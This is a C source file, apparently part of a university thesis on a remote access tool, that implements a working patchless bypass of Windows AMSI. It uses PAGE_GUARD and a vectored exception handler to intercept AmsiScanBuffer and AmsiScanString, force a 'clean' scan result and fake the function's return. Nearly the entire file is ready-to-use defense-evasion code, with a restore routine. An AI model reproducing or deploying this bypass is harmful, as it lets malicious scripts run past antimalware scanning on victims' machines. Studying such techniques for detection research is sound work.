/*
 * amsi_bypass.c
 * AMSI Bypass patchless via PAGE_GUARD + Vectored Exception Handler
 *
 * MITRE ATT&CK: T1562.001 — Impair Defenses: Disable or Modify Tools
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */

#include <windows.h>

/* ── STATUS codes (definiti in winnt.h; fallback per MinGW) ──────────────*/
#ifndef EXCEPTION_GUARD_PAGE
#  define EXCEPTION_GUARD_PAGE   0x80000001UL
#endif
#ifndef EXCEPTION_SINGLE_STEP
#  define EXCEPTION_SINGLE_STEP  0x80000004UL
#endif

/*
 * [RSP+0x30] = 6° argomento (AMSI_RESULT *result) ← TARGET
 * x64 Windows ABI: shadow space 4*8 byte per RCX/RDX/R8/R9
 */
#define RESULT_PTR_RSP_OFFSET   0x30UL

/* AMSI_RESULT_CLEAN = 0 (da amsi.h — contenuto certificato sicuro) */
#ifndef AMSI_RESULT_CLEAN
#  define AMSI_RESULT_CLEAN  0UL
#endif

/* ── Struct: informazioni sulla pagina armata con PAGE_GUARD ─────────────*/
typedef struct _GUARD_PAGE_INFO {
    PVOID  base;       /* BaseAddress da VirtualQuery                     */
    SIZE_T size;       /* RegionSize da VirtualQuery                      */
    DWORD  origProt;   /* Protect originale (senza PAGE_GUARD)            */
} GUARD_PAGE_INFO;

/* ── Stato globale del bypass ────────────────────────────────────────────*/
static PVOID           g_addrScanBuf  = NULL;  /* AmsiScanBuffer entry   */
static PVOID           g_addrScanStr  = NULL;  /* AmsiScanString entry   */
static PVOID           g_vehHandle    = NULL;  /* handle VEH              */
static GUARD_PAGE_INFO g_pgBuf        = {NULL, 0, 0};
static GUARD_PAGE_INFO g_pgStr        = {NULL, 0, 0};

/*
 * g_rearmPending — segnale tra GUARD_PAGE_VIOLATION e SINGLE_STEP:
 *   0 = nessun re-arm pendente
 *   1 = re-arm pagina ScanBuffer
 *   2 = re-arm pagina ScanString
 */
static volatile LONG g_rearmPending = 0;

/* ── _apply_guard: applica PAGE_GUARD e salva info pagina ────────────────*/
static BOOL _apply_guard(PVOID funcAddr, GUARD_PAGE_INFO *out) {
    if (!funcAddr || !out) return FALSE;

    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery(funcAddr, &mbi, sizeof(mbi))) return FALSE;

    /* Se già armata (doppia chiamata o altro thread) conserva solo le info */
    if (mbi.Protect & PAGE_GUARD) {
        out->base     = mbi.BaseAddress;
        out->size     = mbi.RegionSize;
        out->origProt = mbi.Protect & ~PAGE_GUARD;
        return TRUE;
    }

    DWORD old;
    if (!VirtualProtect(mbi.BaseAddress, mbi.RegionSize,
                        mbi.Protect | PAGE_GUARD, &old))
        return FALSE;

    out->base     = mbi.BaseAddress;
    out->size     = mbi.RegionSize;
    out->origProt = mbi.Protect;   /* protezione originale senza PAGE_GUARD */
    return TRUE;
}

/* ── _rearm_guard: re-applica PAGE_GUARD (from VEH on SINGLE_STEP) ──────*/
static VOID _rearm_guard(GUARD_PAGE_INFO *pg) {
    if (!pg || !pg->base) return;
    DWORD old;
    VirtualProtect(pg->base, pg->size, pg->origProt | PAGE_GUARD, &old);
}

/* ─────────────────────────────────────────────────────────────────────────
 * Vectored Exception Handler
 *
 * EXCEPTION_GUARD_PAGE (0x80000001):
 *   ExceptionInformation[0] = tipo accesso (0=R, 1=W, 8=X)
 *   ExceptionInformation[1] = indirizzo accesso (= entry funzione AMSI)
 *   - Se coincide con g_addrScanBuf o g_addrScanStr:
 *     forza AMSI_RESULT_CLEAN, simula RET, imposta TF per re-arm
 *   - Se è sulla nostra pagina ma funzione diversa:
 *     imposta TF per re-arm (non perdiamo la guardia)
 *
 * EXCEPTION_SINGLE_STEP (0x80000004):
 *   Se g_rearmPending != 0 → re-applica PAGE_GUARD sulla pagina corretta
 * ─────────────────────────────────────────────────────────────────────────*/
static LONG NTAPI _amsi_veh(EXCEPTION_POINTERS *ep) {
    DWORD code = ep->ExceptionRecord->ExceptionCode;

    /* ── GUARD_PAGE_VIOLATION ─────────────────────────────────────────── */
    if (code == EXCEPTION_GUARD_PAGE) {
        /* ExceptionInformation[1] = indirizzo dell'accesso in memoria */
        PVOID fault = (PVOID)ep->ExceptionRecord->ExceptionInformation[1];

        BOOL hitBuf = (fault == g_addrScanBuf);
        BOOL hitStr = (g_addrScanStr != NULL && fault == g_addrScanStr);

        if (hitBuf || hitStr) {
            /*
             * ─── Intercettiamo AmsiScanBuffer / AmsiScanString ──────────
             *
             * RSP punta al return address (cima stack dopo CALL).
             * RSP+0x30 = 6° argomento = AMSI_RESULT *result.
             * Stesso layout per entrambe le funzioni (stesso prototipo).
             */
            ULONG_PTR stk = ep->ContextRecord->Rsp;

            /* Forza AMSI_RESULT_CLEAN nel buffer di output */
            ULONG *pResult = *(ULONG **)(stk + RESULT_PTR_RSP_OFFSET);
            if (pResult) {
                *pResult = (ULONG)AMSI_RESULT_CLEAN;
            }

            /*
             * Simula RET:
             *   RIP  ← return address dal top-of-stack
             *   RSP  ← RSP + 8  (POP simulato)
             *   RAX  ← 0        (HRESULT S_OK)
             */
            ep->ContextRecord->Rip = *(ULONG64 *)stk;
            ep->ContextRecord->Rsp = stk + sizeof(ULONG64);
            ep->ContextRecord->Rax = 0ULL;

            /*
             * Trap Flag (bit 8 di EFLAGS) → STATUS_SINGLE_STEP dopo la
             * prossima istruzione → re-arma PAGE_GUARD
             */
            ep->ContextRecord->EFlags |= (DWORD)0x100;
            InterlockedExchange(&g_rearmPending, hitBuf ? 1L : 2L);

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        /*
         * Guard page violation sulla nostra pagina ma funzione diversa
         * (es. AmsiInitialize, AmsiCloseSession, AmsiOpenSession sulla
         * stessa pagina di AmsiScanBuffer).
         * Non intercettiamo la chiamata, ma re-armiamo per non perdere
         * la guardia su AmsiScanBuffer.
         */
        BOOL onBufPage = (g_pgBuf.base != NULL &&
                          fault >= (PVOID)g_pgBuf.base &&
                          fault <  (PVOID)((BYTE*)g_pgBuf.base + g_pgBuf.size));

        BOOL onStrPage = (g_pgStr.base != NULL &&
                          g_pgStr.base != g_pgBuf.base &&
                          fault >= (PVOID)g_pgStr.base &&
                          fault <  (PVOID)((BYTE*)g_pgStr.base + g_pgStr.size));

        if (onBufPage || onStrPage) {
            ep->ContextRecord->EFlags |= (DWORD)0x100;  /* TF */
            InterlockedExchange(&g_rearmPending, onBufPage ? 1L : 2L);
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        /* Non è una nostra pagina */
        return EXCEPTION_CONTINUE_SEARCH;
    }

    /* ── SINGLE_STEP: re-arm PAGE_GUARD ──────────────────────────────── */
    if (code == EXCEPTION_SINGLE_STEP) {
        LONG which = InterlockedExchange(&g_rearmPending, 0L);
        if (which == 0)
            return EXCEPTION_CONTINUE_SEARCH;   /* single-step non nostro */

        if (which == 1)
            _rearm_guard(&g_pgBuf);
        else
            _rearm_guard(&g_pgStr);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ─────────────────────────────────────────────────────────────────────────
 * patch_amsi
 *
 * Carica amsi.dll, risolve AmsiScanBuffer (+ AmsiScanString),
 * registra il VEH e applica PAGE_GUARD alle pagine target.
 *
 * Ritorna:
 *   0 = errore (amsi.dll non trovata o VEH fallito)
 *   1 = AmsiScanBuffer armato (AmsiScanString assente o stessa pagina)
 *   2 = AmsiScanBuffer + AmsiScanString armati su pagine distinte
 * ─────────────────────────────────────────────────────────────────────────*/
DWORD patch_amsi(void) {
    /* Carica amsi.dll — spesso già caricata in processi PowerShell/WSH */
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return 0;

    g_addrScanBuf = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
    g_addrScanStr = (PVOID)GetProcAddress(hAmsi, "AmsiScanString");

    /* AmsiScanBuffer è obbligatoria; AmsiScanString può non esserci */
    if (!g_addrScanBuf) return 0;

    /*
     * Registra VEH in PRIMA posizione nella catena (parametro 1).
     * Garantisce che il nostro handler venga chiamato prima del runtime.
     */
    g_vehHandle = AddVectoredExceptionHandler(1, _amsi_veh);
    if (!g_vehHandle) return 0;

    DWORD ok = 0;

    /* Arma la pagina di AmsiScanBuffer */
    if (_apply_guard(g_addrScanBuf, &g_pgBuf)) ok++;

    /* Gestisci AmsiScanString */
    if (g_addrScanStr) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(g_addrScanStr, &mbi, sizeof(mbi)) &&
            mbi.BaseAddress != g_pgBuf.base)
        {
            /* Pagina distinta: arma separatamente */
            if (_apply_guard(g_addrScanStr, &g_pgStr)) ok++;
        } else {
            /*
             * Stessa pagina di AmsiScanBuffer: già armata.
             * Copia info pagina per consentire re-arm corretto nel VEH.
             */
            g_pgStr = g_pgBuf;
            /* ok non incrementato: una sola pagina fisica armata */
        }
    }

    return ok;
}

/* ─────────────────────────────────────────────────────────────────────────
 * restore_amsi
 *
 * Rimuove il VEH e ripristina la protezione originale delle pagine.
 *
 * Ritorna: numero di pagine ripristinate (0 = fallito o mai patchato)
 * ─────────────────────────────────────────────────────────────────────────*/
DWORD restore_amsi(void) {
    /* Rimuovi il VEH prima di toccare le pagine:
     * il VEH intercetterebbe le nostre stesse VirtualProtect calls */
    if (g_vehHandle) {
        RemoveVectoredExceptionHandler(g_vehHandle);
        g_vehHandle = NULL;
    }

    DWORD ok = 0, old;

    /* Salva base ScanBuf prima di azzerare per confronto con ScanStr */
    PVOID savedBufBase = g_pgBuf.base;

    /* Ripristina protezione originale su pagina di AmsiScanBuffer */
    if (g_pgBuf.base) {
        if (VirtualProtect(g_pgBuf.base, g_pgBuf.size,
                           g_pgBuf.origProt, &old))
            ok++;
    }

    /* Ripristina pagina ScanString solo se distinta da ScanBuffer */
    if (g_pgStr.base && g_pgStr.base != savedBufBase) {
        if (VirtualProtect(g_pgStr.base, g_pgStr.size,
                           g_pgStr.origProt, &old))
            ok++;
    }

    /* Reset stato globale */
    g_addrScanBuf = NULL;
    g_addrScanStr = NULL;
    ZeroMemory(&g_pgBuf, sizeof(g_pgBuf));
    ZeroMemory(&g_pgStr, sizeof(g_pgStr));
    InterlockedExchange(&g_rearmPending, 0L);

    return ok;
}
